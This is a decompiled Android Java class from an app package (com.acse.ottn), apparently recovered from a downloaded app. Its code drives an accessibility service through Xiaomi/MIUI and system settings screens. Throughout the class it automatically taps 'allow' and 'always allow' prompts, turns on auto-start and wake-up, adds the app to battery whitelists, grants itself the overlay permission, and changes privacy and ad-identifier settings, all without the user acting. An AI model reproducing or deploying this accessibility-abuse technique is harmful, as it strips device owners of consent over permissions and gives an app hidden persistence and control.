package com.acse.ottn;

import android.accessibilityservice.AccessibilityService;
import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.Activity;
import android.app.AppOpsManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.Rect;
import android.net.Uri;
import android.os.Binder;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.text.TextUtils;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;
import androidx.annotation.RequiresApi;
import com.acse.ottn.m0;
import com.acse.ottn.util.HelpShopAppUtil;
import com.huawei.hms.framework.common.hianalytics.WiseOpenHianalyticsData;
import com.qq.e.comm.constants.ErrorCode;
import java.util.TimerTask;

/* compiled from: r8-map-id-90f57856855cc25dcb99430ee461a8d254046ac77d3f49675e58b81fe049f342 */
/* loaded from: D:\Downloads\app\classes2.dex */
public class k2 {

    /* renamed from: a, reason: collision with root package name */
    public static final String f4696a = "acse_MiuiUtils";

    /* renamed from: b, reason: collision with root package name */
    public static boolean f4697b;

    /* renamed from: c, reason: collision with root package name */
    public static TimerTask f4698c;

    /* renamed from: d, reason: collision with root package name */
    public static AccessibilityNodeInfo f4699d;

    /* compiled from: r8-map-id-90f57856855cc25dcb99430ee461a8d254046ac77d3f49675e58b81fe049f342 */
    public class a implements m0.d {

        /* renamed from: a, reason: collision with root package name */
        public final /* synthetic */ AccessibilityService f4700a;

        /* renamed from: b, reason: collision with root package name */
        public final /* synthetic */ String f4701b;

        @Override // com.acse.ottn.m0.d
        public void a(long j6) {
            try {
                AccessibilityNodeInfo g6 = com.acse.ottn.b.c().g(this.f4700a, this.f4701b);
                if (g6 == null) {
                    if (HelpShopAppUtil.getContext() == null) {
                        return;
                    }
                    c2.a("samonp-->", "开始滑动");
                    if (k2.f4699d == null) {
                        k2.h(this.f4700a);
                        return;
                    } else {
                        com.acse.ottn.b.c().b(k2.f4699d);
                        return;
                    }
                }
                TimerTask timerTask = k2.f4698c;
                if (timerTask != null) {
                    timerTask.cancel();
                    k2.f4698c = null;
                }
                c2.a(k2.f4696a, "找到了");
                j3.a().a("battery_white", Boolean.TRUE);
                com.acse.ottn.b.c().g(g6);
                if ("samsung".equals(j4.b())) {
                    com.acse.ottn.b.c().a(s0.a().b(100));
                    com.acse.ottn.b.c().e(this.f4700a);
                }
            } catch (Exception e6) {
                c2.a(k2.f4696a, "e =" + e6.getMessage());
            }
        }

        public a(AccessibilityService accessibilityService, String str) {
            this.f4700a = accessibilityService;
            this.f4701b = str;
        }

        @Override // com.acse.ottn.m0.d
        public void a() {
            k2.f4698c = null;
        }
    }

    /* compiled from: r8-map-id-90f57856855cc25dcb99430ee461a8d254046ac77d3f49675e58b81fe049f342 */
    public class b implements m0.d {

        /* renamed from: a, reason: collision with root package name */
        public final /* synthetic */ String f4702a;

        /* renamed from: b, reason: collision with root package name */
        public final /* synthetic */ AccessibilityService f4703b;

        @Override // com.acse.ottn.m0.d
        public void a(long j6) {
            c2.a("samon-->", "clickHouTaiShowPage倒计时 =" + this.f4702a);
            try {
                if (this.f4702a == null) {
                    return;
                }
                AccessibilityNodeInfo g6 = com.acse.ottn.b.c().g(this.f4703b, this.f4702a);
                if (g6 == null) {
                    c2.a("samonp-->", "appNodeInfo is null");
                    if (HelpShopAppUtil.getContext() != null && Build.VERSION.SDK_INT >= 24) {
                        c2.a("samonp-->", "开始滑动");
                        k2.h(this.f4703b);
                        if (k2.f4699d != null) {
                            com.acse.ottn.b.c().b(k2.f4699d);
                            return;
                        }
                        return;
                    }
                    return;
                }
                c2.a("samonp-->", "appNodeInfo is not null");
                TimerTask timerTask = k2.f4698c;
                if (timerTask != null) {
                    timerTask.cancel();
                    k2.f4698c = null;
                }
                c2.a(k2.f4696a, "找到了");
                com.acse.ottn.b.c().g(g6);
                j3.a().a("battery_white", Boolean.FALSE);
                com.acse.ottn.b.c().a(s0.a().b(500));
                AccessibilityNodeInfo j7 = com.acse.ottn.b.c().j(this.f4703b, "始终允许");
                AccessibilityNodeInfo j8 = com.acse.ottn.b.c().j(this.f4703b, "允许");
                if (j7 != null) {
                    c2.a("samonp-->", "appinfo is not null");
                    com.acse.ottn.b.c().g(j7);
                    com.acse.ottn.b.c().a(s0.a().b(200));
                    com.acse.ottn.b.c().e(this.f4703b);
                } else if (j8 != null) {
                    com.acse.ottn.b.c().g(j8);
                    com.acse.ottn.b.c().a(s0.a().b(200));
                    com.acse.ottn.b.c().e(this.f4703b);
                    c2.a("samonp-->", "appinfo1 is not null");
                }
                if (j3.a().a("is_pengpai")) {
                    com.acse.ottn.b.c().e(this.f4703b);
                    com.acse.ottn.b.c().a(s0.a().b(100));
                    com.acse.ottn.b.c().e(this.f4703b);
                }
            } catch (Exception e6) {
                c2.a(k2.f4696a, "e =" + e6.getMessage());
            }
        }

        public b(String str, AccessibilityService accessibilityService) {
            this.f4702a = str;
            this.f4703b = accessibilityService;
        }

        @Override // com.acse.ottn.m0.d
        public void a() {
            k2.f4698c = null;
        }
    }

    /* compiled from: r8-map-id-90f57856855cc25dcb99430ee461a8d254046ac77d3f49675e58b81fe049f342 */
    public class c implements Runnable {

        /* renamed from: a, reason: collision with root package name */
        public final /* synthetic */ AccessibilityService f4704a;

        public c(AccessibilityService accessibilityService) {
            this.f4704a = accessibilityService;
        }

        @Override // java.lang.Runnable
        public void run() {
            com.acse.ottn.b.c().e(this.f4704a);
        }
    }

    /* compiled from: r8-map-id-90f57856855cc25dcb99430ee461a8d254046ac77d3f49675e58b81fe049f342 */
    public class d implements Runnable {

        /* renamed from: a, reason: collision with root package name */
        public final /* synthetic */ AccessibilityNodeInfo f4705a;

        public d(AccessibilityNodeInfo accessibilityNodeInfo) {
            this.f4705a = accessibilityNodeInfo;
        }

        @Override // java.lang.Runnable
        public void run() {
            j3.a().a("auto_start_button", Boolean.TRUE);
            com.acse.ottn.b.c().g(this.f4705a);
        }
    }

    /* compiled from: r8-map-id-90f57856855cc25dcb99430ee461a8d254046ac77d3f49675e58b81fe049f342 */
    public class e implements Runnable {

        /* renamed from: a, reason: collision with root package name */
        public final /* synthetic */ AccessibilityService f4706a;

        public e(AccessibilityService accessibilityService) {
            this.f4706a = accessibilityService;
        }

        @Override // java.lang.Runnable
        public void run() {
            com.acse.ottn.b.c().e(this.f4706a);
        }
    }

    /* compiled from: r8-map-id-90f57856855cc25dcb99430ee461a8d254046ac77d3f49675e58b81fe049f342 */
    public class f implements m0.d {

        /* renamed from: a, reason: collision with root package name */
        public final /* synthetic */ AccessibilityService f4707a;

        @Override // com.acse.ottn.m0.d
        public void a(long j6) {
            AccessibilityNodeInfo j7 = com.acse.ottn.b.c().j(this.f4707a, "隐私与安全");
            if (j7 == null) {
                if (Build.VERSION.SDK_INT >= 24) {
                    com.acse.ottn.b.c().a(this.f4707a, j4.c(HelpShopAppUtil.getContext()) / 3, ((j4.b(HelpShopAppUtil.getContext()) * 2) / 3) + 300, (j4.c(HelpShopAppUtil.getContext()) / 3) + 100, j4.b(HelpShopAppUtil.getContext()) / 3, 300);
                    return;
                }
                return;
            }
            c2.a("samon-->111=", "333");
            com.acse.ottn.b.c().g(j7);
            j3.a().a("oaid_permission", Boolean.TRUE);
            TimerTask timerTask = k2.f4698c;
            if (timerTask != null) {
                timerTask.cancel();
                k2.f4698c = null;
            }
        }

        public f(AccessibilityService accessibilityService) {
            this.f4707a = accessibilityService;
        }

        @Override // com.acse.ottn.m0.d
        public void a() {
            k2.f4698c = null;
        }
    }

    /* compiled from: r8-map-id-90f57856855cc25dcb99430ee461a8d254046ac77d3f49675e58b81fe049f342 */
    public class g implements m0.d {

        /* renamed from: a, reason: collision with root package name */
        public final /* synthetic */ AccessibilityService f4708a;

        @Override // com.acse.ottn.m0.d
        public void a(long j6) {
            AccessibilityNodeInfo j7 = com.acse.ottn.b.c().j(this.f4708a, "更多安全设置");
            if (j7 == null) {
                if (Build.VERSION.SDK_INT >= 24) {
                    com.acse.ottn.b.c().a(this.f4708a, j4.c(HelpShopAppUtil.getContext()) / 3, ((j4.b(HelpShopAppUtil.getContext()) * 2) / 3) + 300, (j4.c(HelpShopAppUtil.getContext()) / 3) + 100, j4.b(HelpShopAppUtil.getContext()) / 3, 300);
                    return;
                }
                return;
            }
            c2.a("samon-->111=", "333");
            com.acse.ottn.b.c().g(j7);
            com.acse.ottn.b.c().a(500L);
            AccessibilityNodeInfo j8 = com.acse.ottn.b.c().j(this.f4708a, "广告服务");
            if (j8 != null) {
                com.acse.ottn.b.c().g(j8);
                j3.a().a("oaid_permission", Boolean.TRUE);
                TimerTask timerTask = k2.f4698c;
                if (timerTask != null) {
                    timerTask.cancel();
                    k2.f4698c = null;
                }
            }
        }

        public g(AccessibilityService accessibilityService) {
            this.f4708a = accessibilityService;
        }

        @Override // com.acse.ottn.m0.d
        public void a() {
            k2.f4698c = null;
        }
    }

    public static int b() {
        String a6 = n3.a("ro.miui.ui.version.name");
        if (a6 == null) {
            return -1;
        }
        try {
            return Integer.parseInt(a6.substring(1));
        } catch (Exception e6) {
            c2.b(f4696a, "get miui version code error, version : " + a6);
            c2.b(f4696a, Log.getStackTraceString(e6));
            return -1;
        }
    }

    public static void c(Activity activity, int i6) {
        if ("".equals(k0.f4687w)) {
            return;
        }
        Intent intent = new Intent("miui.intent.action.APP_PERM_EDITOR");
        intent.setClassName("com.miui.securitycenter", "com.miui.permcenter.permissions.AppPermissionsEditorActivity");
        intent.putExtra("extra_pkgname", k0.f4687w);
        intent.setFlags(268435456);
        if (a(intent, activity)) {
            activity.startActivityForResult(intent, i6);
        } else {
            c2.b(f4696a, "Intent is not available!");
        }
    }

    public static void d(Activity activity, int i6) {
        if ("".equals(k0.f4687w)) {
            return;
        }
        Intent intent = new Intent("miui.intent.action.APP_PERM_EDITOR");
        intent.setClassName("com.miui.securitycenter", "com.miui.permcenter.permissions.AppPermissionsEditorActivity");
        intent.putExtra("extra_pkgname", k0.f4687w);
        intent.setFlags(268435456);
        if (a(intent, activity)) {
            activity.startActivityForResult(intent, i6);
        } else {
            c2.b(f4696a, "Intent is not available!");
        }
    }

    public static void e(Activity activity, int i6) {
        if ("".equals(k0.f4687w)) {
            return;
        }
        j3.a().a("battery_white", Boolean.TRUE);
        Intent intent = new Intent("miui.intent.action.APP_PERM_EDITOR");
        intent.setClassName("com.miui.securitycenter", "com.miui.permcenter.permissions.PermissionsEditorActivity");
        intent.putExtra("extra_pkgname", k0.f4687w);
        intent.setFlags(268435456);
        if (a(intent, activity)) {
            try {
                activity.startActivityForResult(intent, i6);
                return;
            } catch (Exception unused) {
                k0.b(true);
                return;
            }
        }
        Intent intent2 = new Intent("miui.intent.action.APP_PERM_EDITOR");
        intent2.setPackage("com.miui.securitycenter");
        intent2.putExtra("extra_pkgname", k0.f4687w);
        intent2.setFlags(268435456);
        if (!a(intent2, activity)) {
            c2.b(f4696a, "Intent is not available!");
            return;
        }
        try {
            activity.startActivityForResult(intent2, i6);
        } catch (Exception unused2) {
            k0.b(true);
        }
    }

    public static void g(AccessibilityService accessibilityService) {
        f4699d = null;
        com.acse.ottn.b.c().a(500L);
        AccessibilityNodeInfo j6 = com.acse.ottn.b.c().j(accessibilityService, "安全");
        if (j6 != null) {
            com.acse.ottn.b.c().g(j6);
        }
        f4698c = m0.a().b(s0.a().b(3000), s0.a().b(500), new g(accessibilityService));
    }

    public static void m(AccessibilityService accessibilityService) {
        f4699d = null;
        f4698c = m0.a().b(s0.a().b(3000), s0.a().b(500), new f(accessibilityService));
    }

    public static boolean a(Context context) {
        return a(context, 24);
    }

    @SuppressLint({"NewApi"})
    public static void f(AccessibilityService accessibilityService) {
        AccessibilityNodeInfo rootInActiveWindow = accessibilityService.getRootInActiveWindow();
        if (rootInActiveWindow == null) {
            rootInActiveWindow = accessibilityService.getRootInActiveWindow();
        }
        a(rootInActiveWindow, "str");
    }

    @SuppressLint({"NewApi"})
    public static void h(AccessibilityService accessibilityService) {
        AccessibilityNodeInfo rootInActiveWindow = accessibilityService.getRootInActiveWindow();
        if (rootInActiveWindow == null) {
            rootInActiveWindow = accessibilityService.getRootInActiveWindow();
        }
        a(rootInActiveWindow);
    }

    @RequiresApi(api = 16)
    public static void i(AccessibilityService accessibilityService) {
        AccessibilityNodeInfo g6 = com.acse.ottn.b.c().g(accessibilityService, "允许系统唤醒");
        AccessibilityNodeInfo g7 = com.acse.ottn.b.c().g(accessibilityService, "允许被其他应用唤醒");
        int i6 = 0;
        if (g6 != null && g6.getParent() != null) {
            int i7 = 0;
            while (true) {
                if (i7 >= g6.getParent().getChildCount()) {
                    break;
                }
                if (g6.getParent().getChild(i7) != null && "android.widget.CheckBox".equals(g6.getParent().getChild(i7).getClassName())) {
                    if (!g6.getParent().getChild(i7).isChecked()) {
                        com.acse.ottn.b.c().g(g6);
                    }
                } else {
                    i7++;
                }
            }
        }
        if (g7 != null && g7.getParent() != null) {
            while (true) {
                if (i6 >= g7.getParent().getChildCount()) {
                    break;
                }
                if (g7.getParent().getChild(i6) != null && "android.widget.CheckBox".equals(g7.getParent().getChild(i6).getClassName())) {
                    if (!g7.getParent().getChild(i6).isChecked()) {
                        com.acse.ottn.b.c().g(g7);
                    }
                } else {
                    i6++;
                }
            }
        }
        com.acse.ottn.b.c().e(accessibilityService);
        com.acse.ottn.b.c().a(s0.a().b(200));
        com.acse.ottn.b.c().e(accessibilityService);
        k0.c(true);
    }

    @RequiresApi(api = 16)
    public static void j(AccessibilityService accessibilityService) {
        String b6 = j1.c().b();
        c2.a(f4696a, b6);
        f4699d = null;
        com.acse.ottn.b.c().a(s0.a().b(200));
        f4698c = m0.a().b(s0.a().b(20000), s0.a().b(1000), new a(accessibilityService, b6));
    }

    public static void k(AccessibilityService accessibilityService) {
        h(accessibilityService);
    }

    public static void l(AccessibilityService accessibilityService) {
        com.acse.ottn.b.c().a(500L);
        AccessibilityNodeInfo j6 = com.acse.ottn.b.c().j(accessibilityService, "个性化广告推荐");
        if (j6 != null) {
            com.acse.ottn.b.c().g(j6);
        }
        com.acse.ottn.b.c().e(accessibilityService);
        com.acse.ottn.b.c().a(200L);
        com.acse.ottn.b.c().e(accessibilityService);
        com.acse.ottn.b.c().a(200L);
        com.acse.ottn.b.c().e(accessibilityService);
        com.acse.ottn.b.c().a(200L);
        com.acse.ottn.b.c().e(accessibilityService);
    }

    @TargetApi(19)
    public static boolean a(Context context, int i6) {
        if ("".equals(k0.f4687w)) {
            return false;
        }
        AppOpsManager appOpsManager = (AppOpsManager) context.getSystemService("appops");
        try {
            Class cls = Integer.TYPE;
            return ((Integer) AppOpsManager.class.getDeclaredMethod("checkOp", cls, cls, String.class).invoke(appOpsManager, Integer.valueOf(i6), Integer.valueOf(Binder.getCallingUid()), k0.f4687w)).intValue() == 0;
        } catch (Exception e6) {
            c2.b(f4696a, Log.getStackTraceString(e6));
            return false;
        }
    }

    public static void b(Activity activity, int i6) {
        if ("".equals(k0.f4687w)) {
            return;
        }
        String str = k0.f4687w;
        Intent intent = new Intent("android.settings.APPLICATION_DETAILS_SETTINGS");
        intent.setData(Uri.fromParts(WiseOpenHianalyticsData.UNION_PACKAGE, str, null));
        intent.setFlags(268435456);
        if (a(intent, activity)) {
            activity.startActivityForResult(intent, i6);
        } else {
            c2.b(f4696a, "intent is not available!");
        }
    }

    public static void c(AccessibilityService accessibilityService) {
        AccessibilityNodeInfo j6 = com.acse.ottn.b.c().j(accessibilityService, "确定");
        AccessibilityNodeInfo j7 = com.acse.ottn.b.c().j(accessibilityService, "知道了");
        if (j6 != null) {
            j3.a().a("auto_start_button", Boolean.TRUE);
            com.acse.ottn.b.c().a(s0.a().b(200));
            com.acse.ottn.b.c().g(j6);
            com.acse.ottn.b.c().a(s0.a().b(500));
            com.acse.ottn.b.c().e(accessibilityService);
        } else if (j7 != null) {
            new Handler(Looper.getMainLooper()).postDelayed(new d(j7), 100L);
            new Handler(Looper.getMainLooper()).postDelayed(new e(accessibilityService), 500L);
        }
        k0.c(true);
    }

    @RequiresApi(api = 16)
    public static void d(AccessibilityService accessibilityService) {
        f4699d = null;
        com.acse.ottn.b.c().a(500L);
        AccessibilityNodeInfo g6 = com.acse.ottn.b.c().g(accessibilityService, "其他权限");
        if (g6 != null) {
            c2.a("samonp-->", "appNodeInfo is not null=");
            com.acse.ottn.b.c().g(g6);
            j3 a6 = j3.a();
            Boolean bool = Boolean.TRUE;
            a6.a("battery_white", bool);
            j3.a().a("is_pengpai", bool);
            return;
        }
        TimerTask timerTask = f4698c;
        if (timerTask != null) {
            timerTask.cancel();
            f4698c = null;
        }
        String e6 = j3.a().e("OpenPermissionName");
        c2.a("samonp-->", "找到了悬浮窗=" + e6);
        if (e6.equals("定位")) {
            return;
        }
        f4698c = m0.a().b(s0.a().b(ErrorCode.UNKNOWN_ERROR), s0.a().b(500), new b(e6, accessibilityService));
    }

    public static void a(Activity activity, int i6) {
        int b6 = b();
        if (b6 == 5) {
            b(activity, i6);
            return;
        }
        if (b6 == 6) {
            c(activity, i6);
            return;
        }
        if (b6 == 7) {
            d(activity, i6);
            return;
        }
        if (b6 == 8) {
            e(activity, i6);
            return;
        }
        c2.b(f4696a, "this is a special MIUI rom version, its version code " + b6);
    }

    public static void b(Activity activity) {
        if ("".equals(k0.f4687w)) {
            return;
        }
        try {
            Intent intent = new Intent();
            ComponentName componentName = new ComponentName("com.miui.securitycenter", "com.miui.permcenter.permissions.PermissionsEditorActivity");
            intent.putExtra("extra_pkgname", k0.f4687w);
            intent.setComponent(componentName);
            intent.addFlags(268435456);
            j3.a().a("battery_white", Boolean.TRUE);
            activity.startActivityForResult(intent, 10013);
        } catch (Exception unused) {
            k0.b(true);
        }
    }

    public static boolean a(Intent intent, Activity activity) {
        return (intent == null || activity == null || activity.getPackageManager().queryIntentActivities(intent, 65536).size() <= 0) ? false : true;
    }

    @RequiresApi(api = 16)
    public static void a(String str, AccessibilityService accessibilityService) {
        AccessibilityNodeInfo g6 = com.acse.ottn.b.c().g(accessibilityService, str);
        if (g6 == null || g6.getParent() == null) {
            return;
        }
        for (int i6 = 0; i6 < g6.getParent().getChildCount(); i6++) {
            if (g6.getParent().getChild(i6) != null && "android.widget.CheckBox".equals(g6.getParent().getChild(i6).getClassName())) {
                if (!g6.getParent().getChild(i6).isChecked()) {
                    com.acse.ottn.b.c().g(g6.getParent().getChild(i6));
                }
                k0.b(true);
                return;
            }
        }
    }

    @RequiresApi(api = 16)
    public static void e(AccessibilityService accessibilityService) {
        TimerTask timerTask = f4698c;
        if (timerTask != null) {
            timerTask.cancel();
            f4698c = null;
        }
        com.acse.ottn.b.c().a(500L);
        AccessibilityNodeInfo h6 = com.acse.ottn.b.c().h(accessibilityService, "允许显示在其他应用的上层");
        c2.a("samonp-->", "---------------------");
        h(accessibilityService);
        if (h6 == null) {
            c2.a("samonp-->", "没有找到了=允许显示在其他应用的上层");
            AccessibilityNodeInfo g6 = com.acse.ottn.b.c().g(accessibilityService, "显示在其他应用的上层");
            AccessibilityNodeInfo g7 = com.acse.ottn.b.c().g(accessibilityService, "允许此应用显示在您当前使用的其他应用的上层。此应用将能得知您点按的位置或更改屏幕上显示的内容。");
            if (g7 == null || g6 == null) {
                return;
            }
            Rect rect = new Rect();
            g6.getBoundsInScreen(rect);
            Rect rect2 = new Rect();
            g7.getBoundsInScreen(rect2);
            int i6 = rect.right / 2;
            int i7 = rect2.top;
            int i8 = rect.bottom;
            int i9 = ((i7 - i8) / 2) + i8;
            c2.a("samonp-->", "x= " + i6 + "   y = " + i9);
            if (Build.VERSION.SDK_INT >= 24) {
                com.acse.ottn.b.c().a(accessibilityService, i6, i9);
                c2.a(f4696a, "点击了");
            }
        } else {
            c2.a("samonp-->", "找到了=允许显示在其他应用的上层");
            com.acse.ottn.b.c().g(h6);
        }
        com.acse.ottn.b.c().a(300L);
        com.acse.ottn.b.c().e(accessibilityService);
        if (Build.VERSION.SDK_INT >= 30) {
            com.acse.ottn.b.c().e(accessibilityService);
        }
    }

    public static void c(Activity activity) {
        a(activity);
    }

    @RequiresApi(api = 16)
    public static void b(AccessibilityService accessibilityService) {
        AccessibilityNodeInfo g6 = com.acse.ottn.b.c().g(accessibilityService, "自启动");
        if (g6 == null) {
            return;
        }
        com.acse.ottn.b.c().g(g6);
        com.acse.ottn.b.c().a(s0.a().b(300));
        a("允许系统唤醒", accessibilityService);
        com.acse.ottn.b.c().e(accessibilityService);
        j3.a().a("battery_white", Boolean.FALSE);
        com.acse.ottn.b.c().e(accessibilityService);
    }

    public static void a(Activity activity) {
        if ("".equals(k0.f4687w)) {
            return;
        }
        j3 a6 = j3.a();
        Boolean bool = Boolean.TRUE;
        a6.a("battery_white", bool);
        j3.a().a("background_battery_hignt", bool);
        Intent intent = new Intent("android.settings.APPLICATION_DETAILS_SETTINGS");
        intent.setData(Uri.fromParts(WiseOpenHianalyticsData.UNION_PACKAGE, k0.f4687w, null));
        try {
            activity.startActivityForResult(intent, 10015);
        } catch (Exception e6) {
            e6.printStackTrace();
        }
    }

    @RequiresApi(api = 16)
    public static void b(String str, AccessibilityService accessibilityService) {
        AccessibilityNodeInfo g6 = com.acse.ottn.b.c().g(accessibilityService, str);
        if (g6 == null || g6.getParent() == null) {
            return;
        }
        int i6 = 0;
        while (true) {
            if (i6 >= g6.getParent().getChildCount()) {
                break;
            }
            if (g6.getParent().getChild(i6) == null || !"android.widget.CheckBox".equals(g6.getParent().getChild(i6).getClassName())) {
                i6++;
            } else if (!g6.getParent().getChild(i6).isChecked()) {
                com.acse.ottn.b.c().g(g6.getParent().getChild(i6));
                com.acse.ottn.b.c().a(s0.a().b(100));
                c(accessibilityService);
                return;
            }
        }
        if (!j3.a().a("auto_start_button")) {
            com.acse.ottn.b.c().g(g6);
            c(accessibilityService);
        } else {
            new Handler(Looper.getMainLooper()).postDelayed(new c(accessibilityService), 500L);
        }
    }

    @SuppressLint({"NewApi"})
    public static void a(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo != null) {
            for (int i6 = 0; i6 < accessibilityNodeInfo.getChildCount(); i6++) {
                c2.a("samonp-->", accessibilityNodeInfo.getChild(i6).toString());
                if (accessibilityNodeInfo.getChild(i6) != null && ("android.widget.ListView".equals(accessibilityNodeInfo.getChild(i6).getClassName()) || "androidx.recyclerview.widget.RecyclerView".equals(accessibilityNodeInfo.getChild(i6).getClassName()))) {
                    f4699d = accessibilityNodeInfo.getChild(i6);
                    return;
                } else {
                    if (accessibilityNodeInfo.getChild(i6) != null) {
                        a(accessibilityNodeInfo.getChild(i6));
                    }
                }
            }
        }
    }

    @SuppressLint({"NewApi"})
    public static void a(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        if (accessibilityNodeInfo == null || accessibilityNodeInfo.getChildCount() != 0) {
            if (accessibilityNodeInfo != null) {
                for (int i6 = 0; i6 < accessibilityNodeInfo.getChildCount(); i6++) {
                    try {
                        if (accessibilityNodeInfo.getChild(i6) != null) {
                            a(accessibilityNodeInfo.getChild(i6), str);
                        }
                    } catch (Throwable th) {
                        c2.a(f4696a, th.getMessage());
                    }
                }
                return;
            }
            return;
        }
        c2.a("samon-->", accessibilityNodeInfo.toString());
        if (!TextUtils.isEmpty(accessibilityNodeInfo.getText())) {
            String trim = accessibilityNodeInfo.getText().toString().trim();
            c2.a("samon-->content=", trim);
            if (trim.equals(str)) {
                f4699d = accessibilityNodeInfo;
                c2.a("samon-->111=", "1111");
                return;
            }
            return;
        }
        if (TextUtils.isEmpty(accessibilityNodeInfo.getContentDescription())) {
            return;
        }
        String charSequence = accessibilityNodeInfo.getContentDescription().toString();
        c2.a("samon-->ContentDescription=", charSequence);
        if (charSequence.equals(str)) {
            f4699d = accessibilityNodeInfo;
            c2.a("samon-->111=", "2222");
        }
    }
}
